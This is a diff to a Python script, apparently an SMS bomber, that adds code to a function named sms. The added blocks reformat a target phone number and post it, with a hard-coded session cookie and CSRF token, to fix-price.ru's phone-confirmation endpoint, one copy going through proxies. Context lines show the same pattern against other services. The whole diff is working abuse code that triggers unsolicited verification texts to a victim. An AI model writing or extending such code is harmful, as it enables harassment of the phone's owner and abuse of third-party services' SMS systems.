@@ -640,6 +640,56 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					num = number
+					num2=""
+					num2+="+"
+					num2+=code
+					num2+="("
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num2+=")"
+					num2+=' '
+					num2+=num[4]
+					num2+=num[5]
+					num2+=num[6]
+					num2+='-'
+					num2+=num[7]
+					num2+=num[8]
+					num2+='-'
+					num2+=num[9]
+					num2+=num[10]
+					header = {
+						"accept": "application/json, text/javascript, */*; q=0.01",
+						"accept-encoding": "gzip, deflate, br",
+						"accept-language": "en-US,en;q=0.9",
+						"content-length": "126",
+						"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+						"cookie": 'PHPSESSID=1ed2c0543454b3d6f70a921ce7304bf8; BITRIX_SM_SALE_UID=1122918680; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A13%2C%22EXPIRE%22%3A1642712340%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; position_detect=0; position=%7B%22lat%22%3A55.755826%2C%22long%22%3A37.6172999%7D',
+						"dnt": "1",
+						"origin": "https://fix-price.ru",
+						"referer": "https://fix-price.ru/auth/register.php",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"sec-fetch-dest": "empty",
+						"sec-fetch-mode": "cors",
+						"sec-fetch-site": "same-origin",
+						"sec-gpc": "1",
+						"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)",
+						"x-requested-with": "XMLHttpRequest"
+					}
+					payload = {
+						"register_call": "Y",
+						"action": "getCode",
+						"phone": num2,
+						"CSRF": "0abbfef54d3d723d192dd563d00305752ccd4dd2cad330aa83866d7f65e84389"
+					}
+					requests.post("https://fix-price.ru/ajax/confirm14_phone.php", data=payload, headers=header, proxies = proxies)
+				except:
+					pass
+
+				try:
 					payload = {
 						"phoneNumber": f"+{number}"
 					}
@@ -957,6 +1007,56 @@ def sms(prx, number, tm, code):
 						"phone": number
 					}
 					requests.post("https://hemingoway.city-mobil.ru/api/v1/send_link", json=payload)
+				except:
+					pass
+
+				try:
+					num = number
+					num2=""
+					num2+="+"
+					num2+=code
+					num2+="("
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num2+=")"
+					num2+=' '
+					num2+=num[4]
+					num2+=num[5]
+					num2+=num[6]
+					num2+='-'
+					num2+=num[7]
+					num2+=num[8]
+					num2+='-'
+					num2+=num[9]
+					num2+=num[10]
+					header = {
+						"accept": "application/json, text/javascript, */*; q=0.01",
+						"accept-encoding": "gzip, deflate, br",
+						"accept-language": "en-US,en;q=0.9",
+						"content-length": "126",
+						"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+						"cookie": 'PHPSESSID=1ed2c0543454b3d6f70a921ce7304bf8; BITRIX_SM_SALE_UID=1122918680; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A13%2C%22EXPIRE%22%3A1642712340%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; position_detect=0; position=%7B%22lat%22%3A55.755826%2C%22long%22%3A37.6172999%7D',
+						"dnt": "1",
+						"origin": "https://fix-price.ru",
+						"referer": "https://fix-price.ru/auth/register.php",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"sec-fetch-dest": "empty",
+						"sec-fetch-mode": "cors",
+						"sec-fetch-site": "same-origin",
+						"sec-gpc": "1",
+						"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)",
+						"x-requested-with": "XMLHttpRequest"
+					}
+					payload = {
+						"register_call": "Y",
+						"action": "getCode",
+						"phone": num2,
+						"CSRF": "0abbfef54d3d723d192dd563d00305752ccd4dd2cad330aa83866d7f65e84389"
+					}
+					requests.post("https://fix-price.ru/ajax/confirm14_phone.php", data=payload, headers=header)
 				except:
 					pass
 
